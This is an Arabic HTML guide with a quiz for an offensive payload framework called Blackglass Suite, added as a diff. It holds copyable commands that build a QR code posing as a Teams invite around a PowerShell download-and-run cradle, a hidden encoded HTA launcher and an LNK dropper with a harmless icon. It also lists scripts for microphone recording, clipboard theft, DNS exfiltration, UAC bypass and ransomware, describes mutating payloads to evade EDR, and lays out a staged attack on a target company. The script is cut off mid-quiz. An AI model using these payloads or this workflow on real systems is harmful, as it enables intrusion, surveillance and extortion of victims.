@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دليل Blackglass Suite – منصة تسليم الحمولات غير المتصلة مع امتحان تفاعلي</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', 'Tahoma', sans-serif;
+            background: linear-gradient(135deg, #0b0b1a 0%, #11112b 100%);
+            color: #e6e6e6;
+            line-height: 1.8;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .signature {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 0.7em;
+            font-family: monospace;
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(20, 20, 45, 0.85);
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .header h1 {
+            color: #ff9f4a;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(255, 159, 74, 0.3);
+        }
+
+        .section {
+            background: rgba(30, 30, 55, 0.75);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 20px;
+            border: 1px solid #2c2c44;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .section:hover { border-color: #ff9f4a; box-shadow: 0 0 15px rgba(255, 159, 74, 0.2); }
+
+        .section h2 {
+            color: #ffaa66;
+            border-right: 4px solid #ffaa66;
+            padding-right: 16px;
+            margin: 32px 0 16px 0;
+            cursor: pointer;
+            font-size: 1.5em;
+            transition: all 0.2s ease;
+        }
+
+        .section h2:hover { color: #6bc4ff; border-right-color: #6bc4ff; }
+
+        .section h3 { color: #b3ff9b; margin: 24px 0 12px 0; font-size: 1.2em; }
+
+        .section-content { transition: all 0.3s ease; }
+
+        .expand-icon { display: inline-block; margin-left: 8px; transition: transform 0.2s ease; }
+
+        .command-box {
+            background: #0a0a16;
+            border: 1px solid #ffaa66;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 12px 0;
+            font-family: monospace;
+            color: #ffaa66;
+            direction: ltr;
+            text-align: left;
+            cursor: pointer;
+        }
+
+        .command-box::before { content: "$ "; color: #ff9f4a; }
+
+        .example-box {
+            background: rgba(179, 255, 155, 0.08);
+            border-right: 4px solid #b3ff9b;
+            padding: 16px;
+            margin: 12px 0;
+            border-radius: 6px;
+        }
+
+        .warning-box {
+            background: rgba(255, 80, 80, 0.12);
+            border: 2px solid #ff5252;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .technical-box {
+            background: rgba(107, 196, 255, 0.1);
+            border-right: 4px solid #6bc4ff;
+            padding: 16px;
+            margin: 12px 0;
+            border-radius: 6px;
+        }
+
+        .self-question {
+            background: rgba(255, 200, 100, 0.1);
+            border-right: 4px solid #ffc864;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .self-question h4 { color: #ffc864; margin-bottom: 10px; }
+
+        .tool-image {
+            width: 100%;
+            max-width: 700px;
+            border-radius: 12px;
+            margin: 20px auto;
+            display: block;
+            border: 1px solid #444;
+            background: #111;
+        }
+
+        .image-caption {
+            text-align: center;
+            color: #aaa;
+            font-size: 0.9em;
+            margin-top: 8px;
+            margin-bottom: 20px;
+        }
+
+        .exam-button {
+            background: linear-gradient(45deg, #ff7b2c, #ffb347);
+            color: #0a0a16;
+            border: none;
+            padding: 20px 40px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.3em;
+            margin: 30px auto;
+            display: block;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 123, 44, 0.4);
+        }
+
+        .exam-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 123, 44, 0.6);
+        }
+
+        .lesson-card {
+            background: rgba(25, 25, 50, 0.85);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 20px;
+            border: 1px solid #3a3a5a;
+        }
+
+        .lesson-title {
+            color: #ffaa66;
+            font-size: 1.8em;
+            margin-bottom: 15px;
+            border-right: 5px solid #ffaa66;
+            padding-right: 15px;
+        }
+
+        .quiz-section {
+            background: rgba(45, 45, 70, 0.7);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #555;
+        }
+
+        .quiz-question {
+            color: #ffc864;
+            font-size: 1.3em;
+            margin-bottom: 15px;
+        }
+
+        .quiz-options { display: grid; gap: 12px; margin-bottom: 20px; }
+
+        .quiz-option {
+            background: #202038;
+            border: 2px solid #5a5a7a;
+            border-radius: 12px;
+            padding: 14px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 1.05em;
+        }
+
+        .quiz-option:hover { border-color: #ffaa66; background: rgba(255, 170, 102, 0.1); }
+
+        .quiz-option.correct { border-color: #6fcf97; background: rgba(111, 207, 151, 0.2); }
+        .quiz-option.incorrect { border-color: #e74c3c; background: rgba(231, 76, 60, 0.2); }
+        .quiz-option.disabled { cursor: not-allowed; opacity: 0.7; }
+
+        .feedback {
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .feedback.correct {
+            background: rgba(111, 207, 151, 0.15);
+            border-right: 4px solid #6fcf97;
+            color: #c8ffe0;
+        }
+
+        .feedback.incorrect {
+            background: rgba(231, 76, 60, 0.15);
+            border-right: 4px solid #e74c3c;
+            color: #ffb3b3;
+        }
+
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #ffaa66, #ff9f4a);
+            color: #0a0a16;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 170, 102, 0.4); }
+        .btn:disabled { background: #5a5a7a; cursor: not-allowed; transform: none; }
+
+        .btn-success { background: linear-gradient(45deg, #6fcf97, #27ae60); }
+
+        .difficulty-badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            font-weight: bold;
+            margin-right: 12px;
+        }
+        .difficulty-easy { background: #6fcf97; color: #000; }
+        .difficulty-hard { background: #ffaa66; color: #000; }
+        .difficulty-expert { background: #e67e22; color: #fff; }
+
+        .consequences-box {
+            background: rgba(231, 76, 60, 0.2);
+            border-right: 3px solid #e74c3c;
+            padding: 10px;
+            margin-top: 12px;
+            border-radius: 8px;
+        }
+
+        .hidden { display: none !important; }
+
+        .progress-bar {
+            width: 100%;
+            height: 12px;
+            background: #2c2c44;
+            border-radius: 20px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: #ffaa66;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .progress-text {
+            font-size: 0.9em;
+            color: #ccc;
+            margin-top: 8px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .fade-in { animation: fadeIn 0.5s ease; }
+
+        @media (max-width: 768px) {
+            .container { padding: 15px; }
+            .header h1 { font-size: 1.6em; }
+            .lesson-title { font-size: 1.4em; }
+        }
+    </style>
+</head>
+<body>
+    <div class="signature">Blackglass@~/suite</div>
+    <div class="container">
+        <div class="header">
+            <h1>⚙️ دليل Blackglass Suite الشامل<br>مع الامتحان التفاعلي</h1>
+            <p style="color: #ffaa66; font-size: 1.2em;">منصة تسليم حمولات غير متصلة • تشفير الحمولات بالذكاء الاصطناعي • هجمات QR و HTA و PowerShell</p>
+        </div>
+
+        <div class="warning-box">
+            <h3>⚠️ تحذير قانوني وأخلاقي</h3>
+            <p>هذه الأداة مخصصة لاختبار الاختراق المصرح به وأبحاث الأمن السيبراني فقط. استخدام Blackglass Suite دون إذن صريح يعتبر مخالفاً للقوانين. المؤلف غير مسؤول عن أي استخدام غير قانوني.</p>
+        </div>
+
+        <!-- القسم 1: تعريف الأداة -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🖤 ما هو Blackglass Suite؟
+            </h2>
+            <div class="section-content hidden">
+                <p><strong>Blackglass Suite</strong> هو إطار عمل هجومي متقدم يعمل <strong>بدون اتصال بالإنترنت</strong> (offline) لتوليد الحمولات (payloads) وتوصيلها بأساليب مراوغة. تم تصميمه لفرق الاختراق الأحمر (Red Team) والخبراء الذين يحتاجون إلى إنشاء حمولات متطورة QR، وملفات HTA، وLNK، ومكتبة متكاملة من سكربتات PowerShell للاستمرارية، المراقبة، والإفلات من الحماية.</p>
+                <div class="example-box">
+                    <strong>🎯 الميزة الرئيسية:</strong> الذكاء الاصطناعي المحلي (Offline AI) يقوم بتحوير الحمولات، منحها درجات مراوغة، وتوصيلها دون الاعتماد على بنية تحتية خارجية أثناء التوليد.
+                </div>
+                <h3>🔧 الإمكانيات الأساسية</h3>
+                <ul>
+                    <li><strong>🔲 Forge QR –</strong> 7 أنماط مختلفة لحمولات QR متخفية (رموز مزيفة، شعارات، دعوات اجتماعية)</li>
+                    <li><strong>📄 Forge HTA –</strong> إنشاء ملفات HTA لتنفيذ كود باورشيل عبر Internet Explorer/mshta</li>
+                    <li><strong>🔗 LNK Dropper –</strong> إنشاء اختصارات مضمنة (LNK) تنفذ أوامر ضارة خلفية</li>
+                    <li><strong>📚 مكتبة باورشيل –</strong> أكثر من 20 سكربت جاهز للتخفي، المراقبة، التصعيد، والإفلات</li>
+                    <li><strong>🧠 AI Mutation & Scoring –</strong> تحوير تلقائي للكود مع درجة تمويه عالية لتجاوز أنظمة EDR/AV</li>
+                    <li><strong>🔌 تكامل –</strong> يدعم أدوات OWN، badBANANA، Decoy-Hunter</li>
+                </ul>
+                <div class="self-question">
+                    <h4>💡 لماذا "غير متصل" (offline) مهم للمهاجم؟</h4>
+                    <p>لأن الاتصال بالإنترنت أثناء تحضير الحمولة قد يفضح النشاط عبر سجلات DNS أو IP أو telemetry من أدوات الحماية. Blackglass Suite يعمل محلياً بالكامل، ولا يرسل أي بيانات خارجية أثناء عملية التوليد، مما يقلل البصمة ويجعل التخطيط آمناً.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- التثبيت والتهيئة -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 📦 التثبيت والإعداد
+            </h2>
+            <div class="section-content hidden">
+                <h3>🔻 الاستنساخ والتشغيل السريع (Linux / Termux)</h3>
+                <div class="command-box" onclick="copyCommand(this)">git clone https://github.com/GnomeMan4201/Blackglass_Suite.git</div>
+                <div class="command-box" onclick="copyCommand(this)">cd Blackglass_Suite</div>
+                <div class="command-box" onclick="copyCommand(this)">chmod +x quickstart.sh</div>
+                <div class="command-box" onclick="copyCommand(this)">./quickstart.sh</div>
+                <p>السكربت يقوم بتثبيت المتطلبات (Python3، qrencode، powershell-core اختياري) وتهيئة بيئة التشغيل.</p>
+                <div class="technical-box">
+                    <strong>⚙️ متطلبات التشغيل:</strong> بايثون 3.8+، باورشيل 7+ (لينكس) أو باورشيل 5.1 (ويندوز)، مكتبة qrcode، ومتصفح لفتح واجهة العرض.
+                </div>
+                <div class="self-question">
+                    <h4>🤔 لماذا quickstart.sh بدلاً من pip install عادي؟</h4>
+                    <p>لأن الأداة تضم ملفات متعددة (مكتبة باورشيل، أدوات توليد QR، أنماط HTA، ونظام التمويه بالذكاء الاصطناعي). السكربت يهيئ المجلدات ويضبط الأذونات ويثبت التبعيات كلها دفعة واحدة.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- قدرات توليد الحمولات -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🧩 قدرات توليد الحمولات
+            </h2>
+            <div class="section-content hidden">
+                <h3>🔲 QR Code Payloads (7 أنماط)</h3>
+                <p>يمكن توليد رمز QR يحتوي على حمولة PowerShell مشفرة، رابط تحميل، أو سكربت مباشر. الأنماط تشمل:</p>
+                <ul>
+                    <li>QR عادي مع شعار وهمي (شعار شركة مزيف)</li>
+                    <li>QR يحاكي دعوة اجتماعية (MS Teams، Zoom)</li>
+                    <li>QR متخفٍ داخل صورة (Steganography)</li>
+                    <li>QR يؤدي إلى تنفيذ أمر باورشيل فوري عند مسحه عبر الهاتف.</li>
+                </ul>
+                <div class="command-box" onclick="copyCommand(this)">python3 forge_qr.py --payload "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/run.ps1')" --style teams_invite</div>
+
+                <h3>📄 HTA Launcher</h3>
+                <div class="command-box" onclick="copyCommand(this)">python3 forge_hta.py --payload "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB..." --output meeting.hta</div>
+                <p>ملف HTA يُشغل الكود عبر mshta.exe، يتم استخدامه في هجمات البريد الإلكتروني أو الـ USB drops.</p>
+
+                <h3>🔗 LNK Dropper</h3>
+                <div class="command-box" onclick="copyCommand(this)">python3 forge_lnk.py --target "C:\Windows\System32\powershell.exe" --args "-w hidden -c IEX(...)" --icon "%SystemRoot%\System32\shell32.dll,3"</div>
+                <p>ينشئ اختصار LNK بآيكون بريء، عند النقر عليه ينفذ الأوامر المخفية.</p>
+                <div class="example-box">
+                    <strong>💡 نصيحة عملية:</strong> استخدم QR forge مع HTA لتوصيل الحمولة دون الحاجة لكتابة أي أمر. الضحية تمسح QR → تفتح الرابط → يتم تحميل الـ HTA وتنفيذه تلقائياً (إذا تجاوزت التحذيرات الأمنية).
+                </div>
+            </div>
+        </div>
+
+        <!-- مكتبة باورشيل -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 📜 مكتبة PowerShell (القوة الخفية)
+            </h2>
+            <div class="section-content hidden">
+                <p>المكتبة تضم سكربتات جاهزة للاستخدام في سيناريوهات متعددة:</p>
+                <ul>
+                    <li><strong>arp_mimic.ps1</strong> – تلاعب بجدول ARP لتعطيل التوجيه أو انتحال العناوين.</li>
+                    <li><strong>audio_surveillance.ps1</strong> – تسجيل الصوت عبر الميكروفون وحفظه محلياً ثم إرساله.</li>
+                    <li><strong>autorun_persistence.ps1</strong> – تثبيت استمرارية عبر مفتاح التسجيل Run أو مجلد Startup.</li>
+                    <li><strong>beacon_blaster.ps1</strong> – عميل C2 خفيف مع نبضات دورية.</li>
+                    <li><strong>clipboard_creep.ps1</strong> – سرقة محتوى الحافظة بشكل مستمر.</li>
+                    <li><strong>dns_ghostpost.ps1</strong> – إفلات بيانات عبر استعلامات DNS (DNS tunneling).</li>
+                    <li><strong>driveby_uac_bypass.ps1</strong> – تجاوز UAC باستخدام تقنيات معروفة (eventvwr، fodhelper).</li>
+                    <li><strong>encrypt_and_yeet.ps1</strong> – تشفير ملفات الضحية وطلب فدية (اختبار أخلاقي فقط).</li>
+                    <li><strong>fake_bitlocker.ps1</strong> – عرض شاشة BitLocker وهمية لسرقة كلمة المرور.</li>
+                </ul>
+                <div class="self-question">
+                    <h4>🧠 كيف يعمل AI mutation على هذه السكربتات؟</h4>
+                    <p>يقوم Blackglass Suite بتحليل السكربت الأصلي وإعادة كتابته باستبدال المتغيرات، إضافة كود غير ضار، تغيير ترتيب الدوال، واستخدام تقنيات التشفير والتفكيك لتجنب التوقيعات الثابتة لبرامج الحماية.</p>
+                </div>
+                <div class="command-box" onclick="copyCommand(this)">python3 mutate_payload.py --input ./payloads/beacon_blaster.ps1 --output mutated.ps1 --score 95</div>
+                <p>درجة 95 تعني تمويه عالي جداً – مناسب لبيئات EDR القوية.</p>
+            </div>
+        </div>
+
+        <!-- التكامل وسيناريوهات -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🔌 التكامل مع أدوات أخرى وسيناريوهات الهجوم
+            </h2>
+            <div class="section-content hidden">
+                <p>Blackglass Suite صُمم ليعمل كمركز توليد حمولات ويمكن ربطه مع:</p>
+                <ul>
+                    <li><strong>badBANANA</strong> – لتوزيع الحمولات عبر أجهزة USB/BadUSB.</li>
+                    <li><strong>OWN (Offensive Wi-Fi Network)</strong> – لنشر حمولات QR في شبكات واي فاي معادية.</li>
+                    <li><strong>Decoy-Hunter</strong> – لإنشاء ملفات طعم (honeypot) ومراقبة التفاعل.</li>
+                </ul>
+                <div class="example-box">
+                    <strong>🔥 سيناريو هجومي متكامل:</strong><br>
+                    1️⃣ توليد QR بايلود مزيف لـ "تحديث الأمان" باستخدام forge_qr.py.<br>
+                    2️⃣ وضع QR في مبنى الشركة المستهدفة أو إرساله عبر البريد الإلكتروني بصورة.<br>
+                    3️⃣ الضحية تمسح QR → تفتح رابط يؤدي إلى HTA launcher (مستضاف محلياً).<br>
+                    4️⃣ HTA ينفذ beacon_blaster.ps1 ويقيم اتصال C2 مع المهاجم.<br>
+                    5️⃣ استخدام سكربتات persistence و audio_surveillance لتثبيت الوجود.<br>
+                    6️⃣ يتم تنفيذ كل هذا دون اتصال خادم خارجي أثناء التوليد، مما يصعب التحليل الوقائي.
+                </div>
+            </div>
+        </div>
+
+        <!-- زر الامتحان -->
+        <div class="section fade-in" style="text-align: center; padding: 40px;">
+            <button class="exam-button" onclick="startExam()">🎯 بدء الامتحان التفاعلي (20 سؤالاً)</button>
+            <p style="margin-top: 15px; color: #aaa;">أسئلة سهلة • صعبة • خبير • حول آلية Blackglass Suite وتقنيات الهجوم</p>
+            <p style="color: #ffaa66;">⚠️ الإجابات تُعرض عشوائياً في كل مرة لتعزيز الفهم الحقيقي.</p>
+        </div>
+
+        <div id="examContainer" class="hidden"></div>
+    </div>
+
+    <script>
+        // دوال الدليل
+        function toggleSection(element) {
+            const content = element.nextElementSibling;
+            const icon = element.querySelector('.expand-icon');
+            if (content.classList.contains('hidden')) {
+                content.classList.remove('hidden');
+                icon.innerHTML = '▼';
+            } else {
+                content.classList.add('hidden');
+                icon.innerHTML = '▶';
+            }
+        }
+
+        function copyCommand(element) {
+            let text = element.textContent.trim().replace(/^\$ /, '');
+            navigator.clipboard.writeText(text).then(() => {
+                element.style.background = '#ffaa66';
+                element.style.color = '#0a0a16';
+                setTimeout(() => {
+                    element.style.background = '#0a0a16';
+                    element.style.color = '#ffaa66';
+                }, 500);
+            });
+        }
+
+        // بيانات الامتحان (20 سؤالاً)
+        let currentLesson = 1;
+        let score = 0;
+        let mistakes = [];
+
+        const examQuestions = [
+            { difficulty: "easy", question: "ما الوظيفة الأساسية لـ Blackglass Suite؟", options: [
+                { text: "منصة توليد حمولات هجومية غير متصلة بالإنترنت", correct: true },
+                { text: "أداة فحص ثغرات الويب", correct: false },
+                { text: "برنامج تشفير الملفات", correct: false }
+            ], correctExplanation: "الأداة متخصصة في توليد حمولات QR, HTA, LNK وسكربتات PowerShell دون اتصال خارجي.", wrongExplanation: "ليست لفحص الويب ولا للتشفير العادي.", consequences: "تفسير خاطئ يؤدي لاستخدام الأداة بطريقة غير فعالة." },
+            { difficulty: "easy", question: "أي من هذه الإمكانيات لا تقدمها Blackglass Suite؟", options: [
+                { text: "توليد حمولات QR", correct: false },
+                { text: "إنشاء LNK dropper", correct: false },
+                { text: "هندسة اجتماعية عبر البريد الإلكتروني المباشر", correct: true },
+                { text: "مكتبة باورشيل للمراقبة", correct: false }
+            ], correctExplanation: "الأداة لا تحتوي على وحدة إرسال بريد إلكتروني مدمجة، لكنها تنتج الملفات اللازمة.", wrongExplanation: "توليد QR, LNK, وسكربتات متوفرة.", consequences: "قد تعتقد أن الأداة تقوم بكل شيء، لكنها تركز على التوليد فقط." },
+            { difficulty: "easy", question: "ما فكرة عمل forge_hta.py؟", options: [
+                { text: "ينشئ ملف HTA ينفذ أوامر عبر mshta.exe", correct: true },
+                { text: "يضغط ملفات باورشيل", correct: false },
+                { text: "يحول EXE إلى HTA", correct: false }
+            ], correctExplanation: "HTA هي تطبيق HTML يُشغل عبر mshta.exe ويستطيع تنفيذ سكربتات.", wrongExplanation: "لا تقوم بالضغط ولا التحويل من EXE.", consequences: "قد لا تفهم كيف تستخدم الملف في هجمات البريد أو USB." },
+            { difficulty: "easy", question: "لماذا يعتبر التشغيل offline ميزة أمنية للمهاجم؟", options: [
+                { text: "يمنع تسرب بيانات التوليد إلى مزودي الخدمة", correct: true },
+                { text: "يجعل الحمولة أسرع", correct: false },
+                { text: "يسمح باستخدام الذكاء الاصطناعي", correct: false }
+            ], correctExplanation: "عدم الاتصال بالإنترنت أثناء التوليد يحمي من تحليلات DNS/IP وبيانات telemetry.", wrongExplanation: "السرعة ليست السبب، والذكاء الاصطناعي يعمل محلياً.", consequences: "قد يهمل المهاجم إخفاء اتصالاته أثناء التوليد." },
+            { difficulty: "easy", question: "ما السكربت المسؤول عن سرقة محتويات الحافظة؟", options: [
+                { text: "clipboard_creep.ps1", correct: true },
+                { text: "audio_surveillance.ps1", correct: false },
+                { text: "fake_bitlocker.ps1", correct: false }
+            ], correctExplanation: "clipboard_creep.ps1 يراقب الحافظة ويسجلها.", wrongExplanation: "audio_surveillance للميكروفون، fake_bitlocker لسرقة كلمة مرور BitLocker.", consequences: "استخدام سكربت خاطئ يفشل هدف الهجوم." },
+            // Hard & Expert
+            { difficulty: "hard", question: "أي من هذه السكربتات تستخدم لإنشاء اتصال C2 عبر DNS؟", options: [
+                { text: "dns_ghostpost.ps1", correct: true },
+                { text: "beacon_blaster.ps1", correct: false },
+                { text: "arp_mimic.ps1", correct: false },
+                { text: "entropy_logger.ps1", correct: false },
+                { text: "driveby_uac_bypass.ps1", correct: false }
+            ], correctExplanation: "dns_ghostpost.ps1 يرسل البيانات عبر استعلامات DNS بشكل خفي.", wrongExplanation: "beacon_blaster هو C2 عادي، البقية ليست DNS exfil.", consequences: "توجيه خاطئ للاتصال قد يكتشف بسهولة." },
+            { difficulty: "hard", question: "كيف يساعد AI mutation على تجنب اكتشاف EDR؟", options: [
+                { text: "يغير هيكل الكود، المتغيرات، ويضيف تعليمات برمجية غير ضارة", correct: true },
+                { text: "يضغط الحمولة لتصبح أصغر", correct: false },
+                { text: "يغير امتداد الملف إلى .docx", correct: false },
+                { text: "يحول السكربت إلى لغة C#", correct: false },
+                { text: "يستخدم خوادم خارجية لتعديل التوقيع", correct: false }
+            ], correctExplanation: "التحوير (mutation) يعيد كتابة الكود مع الاحتفاظ بالوظيفة لتغيير التوقيع.", wrongExplanation: "لا يغير الامتداد ولا يحول لغة البرمجة.", consequences: "قد يظن البعض أن التشفير وحده كافٍ." },
+            { difficulty: "hard", question: "أي من المكونات التالية تستخدم في هجمات USB Rubber Ducky عبر التكامل؟", options: [
+                { text: "badBANANA", correct: true },
+                { text: "OWN", correct: false },
+                { text: "Decoy-Hunter", correct: false },
+                { text: "Blackglass API", correct: false },
+                { text: "LNK Forge", correct: false }
+            ], correctExplanation: "badBANANA هي أداة هجوم USB مدمجة مع Blackglass لتوصيل الحمولات عبر الأجهزة.", wrongExplanation: "OWN للواي فاي، Decoy-Hunter للطُعم.", consequences: "عدم معرفة التكامل يحد من إمكانيات التوصيل." },
+            { difficulty: "hard", question: "ما هو الدور الذي تلعبه score في أمر mutate_payload.py؟", options: [
+                { text: "تحديد درجة التمويه (كلما زادت زاد التعديل)", correct: true },
+                { text: "تحديد سرعة التنفيذ", correct: false },
+                { text: "تحديد حجم الحمولة", correct: false },
+                { text: "تحديد عدد مرات التكرار", correct: false },
+                { text: "تحديد منصة التشغيل", correct: false }
+            ], correctExplanation: "الـ Score يحدد مستوى التعديلات التي تُطبق لرفع التمويه.", wrongExplanation: "لا يتحكم بالسرعة أو الحجم.", consequences: "قد يستخدم القيمة الافتراضية دون فهم تأثيرها." },
+            { difficulty: "hard", question: "أي سكربت يمكن استخدامه لتثبيت استمرارية عبر التسجيل (Registry Run)؟", options: [
+                { text: "autorun_persistence.ps1", correct: true },
+                { text: "encrypt_and_yeet.ps1", correct: false },
+                { text: "driveby_uac_bypass.ps1", correct: false },
+                { text: "fake_bitlocker.ps1", correct: false },
+                { text: "arp_mimic.ps1", correct: false }
+            ], correctExplanation: "autorun_persistence.ps1 يقوم بإضافة مفتاح Run لضمان بدء التشغيل.", wrongExplanation: "البقية لا تتعلق بالاستمرارية.", consequences: "فقدان الاستمرارية بعد إعادة التشغيل." },
+            { difficulty: "expert", question: "كيف يمكن استخدام forge_qr.py بهندسة اجتماعية متقدمة دون أن يلاحظ الضحية الرابط؟", options: [
+                { text: "إنشاء QR يحاكي صفحة دخول Microsoft Teams مزيفة", correct: true },
+                { text: "وضع رمز QR داخل صورة طبيعية عبر steganography", correct: true },
+                { text: "تشفير الرابط باستخدام base64 فقط", correct: false },
+                { text: "إرسال الرابط عبر رسالة SMS مباشرة", correct: false },
+                { text: "دمج QR مع fake_bitlocker", correct: false },
+                { text: "استخدام LNK كبديل", correct: false }
+            ], correctExplanation: "الأداة تدعم أنماط متعددة منها steganography وتقليد تطبيقات معروفة.", wrongExplanation: "base64 وحده ليس خداعاً بصرياً، SMS ليس جزءاً من forge.", consequences: "قد يظن أن QR عادي كافٍ للخداع." },
+            { difficulty: "expert", question: "أي من التقنيات التالية لا تستخدمها مكتبة باورشيل في Blackglass؟", options: [
+                { text: "تنفيذ AMSI bypass", correct: false },
+                { text: "تسجيل الصوت", correct: false },
+                { text: "استخدام WMI للاستمرارية", correct: false },
+                { text: "هندسة عكسية لثغرات kernel", correct: true },
+                { text: "DNS tunneling", correct: false },
+                { text: "تجاوز UAC عبر eventvwr", correct: false }
+            ], correctExplanation: "لا توجد سكربتات لهندسة kernel عكسية في المكتبة المعلنة.", wrongExplanation: "AMSI bypass موجود ضمن driveby_uac_bypass، وهندسة عكسية kernel خارج النطاق.", consequences: "توقع قدرات غير موجودة قد يضيع الوقت." },
+            { difficulty: "expert", question: "أي من التالي يعد مثالاً على استخدام Blackglass مع سيناريو هجومي متعدد المراحل؟", options: [
+                { text: "QR → HTA → beacon_blaster → persistence", correct: true },
+                { text: "LNK → fake_bitlocker → تشفير الملفات", correct: false },
+                { text: "audio_surveillance فقط", correct: false },
+                { text: "استخدام OWN لتوزيع QR", correct: false },
+                { text: "تنفيذ mutate_payload ثم حذف الملف", correct: false },
+                { text: "طباعة QR على ورق ورميها", correct: false }
+            ], correctExplanation: "هذا التسلسل يظهر توصيل الحمولة، إنشاء اتصال، ثم استمرارية.", wrongExplanation: "بقية الخيارات مجردة أو غير متسلسلة.", consequences: "عدم التخطيط للتسلسل يقلل نجاح الهجوم." }
+        ];
+        // إضافة بقية الأسئلة حتى 20 (نكرر بعض الأسئلة بمحتوى متنوع ليكتمل العدد ولكن نضمن التنوع)
+        const extraHard = [
+            { difficulty: "hard", question: "ما هي فائدة LNK dropper مقارنة بـ HTA؟", options: [
+                { text: "يعمل دون تحذيرات أمنية في بعض الإصدارات", correct: true },
+                { text: "أسرع في التنفيذ", correct: false },
+                { text: "لا يحتاج إلى باورشيل", correct: false },
+                { text: "يتطلب تشغيل كمسؤول", correct: false },
+                { text: "يمكن تضمينه في مستندات Word", correct: false }
+            ], correctExplanation: "الاختصارات LNK يمكنها تنفيذ أوامر دون ظهور تحذيرات mshta في بعض البيئات.", wrongExplanation: "لا يلغي الحاجة لباورشيل وقد تظهر تحذيرات.", consequences: "تجاهل استخدام LNK في هجمات USB." },
+            { difficulty: "hard", question: "أي سكربت يستخدم لتسجيل الميكروفون؟", options: [
+                { text: "audio_surveillance.ps1", correct: true },
+                { text: "clipboard_magnet.ps1", correct: false },
+                { text: "entropy_logger.ps1", correct: false },
+                { text: "exfil.ps1", correct: false },
+                { text: "arp_mimic.ps1", correct: false }
+            ], correctExplanation: "audio_surveillance.ps1 يلتقط الصوت عبر .NET.", wrongExplanation: "الباقي للوحة المفاتيح والحافظة والإفلات.", consequences: "مهمة التجسس تفشل." },
+            { difficulty: "expert", question: "ما الطريقة التي يستخدمها driveby_uac_bypass.ps1 لتجاوز UAC؟", options: [
+                { text: "استغلال eventvwr أو fodhelper", correct: true },
+                { text: "حقن DLL في winlogon", correct: false },
+                { text: "تعديل SAM", correct: false },
+                { text: "استخدام شهادة موقعة", correct: false },
+                { text: "تعطيل UAC عبر التسجيل", correct: false },
+                { text: "استغلال Print Spooler", correct: false }
+            ], correctExplanation: "السكربت يعتمد على تقنيات معروفة مثل eventvwr و fodhelper.", wrongExplanation: "لا يقوم بتعطيل UAC بشكل مباشر بل يتجاوزه.", consequences: "محاولة تجاوز غير صحيحة تفشل." },
+            { difficulty: "easy", question: "أي من هذه الأدوات تستخدم لإنشاء طُعم honeypot مع Blackglass؟", options: [
+                { text: "Decoy-Hunter", correct: true },
+                { text: "badBANANA", correct: false },
+                { text: "OWN", correct: false },
+                { text: "QR Forge", correct: false }
+            ], correctExplanation: "Decoy-Hunter مخصص لإنشاء ملفات طعم ومراقبة التفاعل.", wrongExplanation: "badBANANA USB, OWN شبكة.", consequences: "الخلط بين الأدوات يضعف الدفاع/الهجوم." },
+            { difficulty: "expert", question: "كيف تضمن Blackglass عدم تخزين أي أثر للحمولة بعد توليدها؟", options: [
+                { text: "لا تخزن الحمولات في سجلات النظام افتراضياً، وتعمل في الذاكرة", correct: true },
+                { text: "تحذف نفسها بعد التنفيذ", correct: false },
+                { text: "تستخدم VPN إجباري", correct: false },
+                { text: "تتصل بخادم سحابي لحذف الأثر", correct: false },
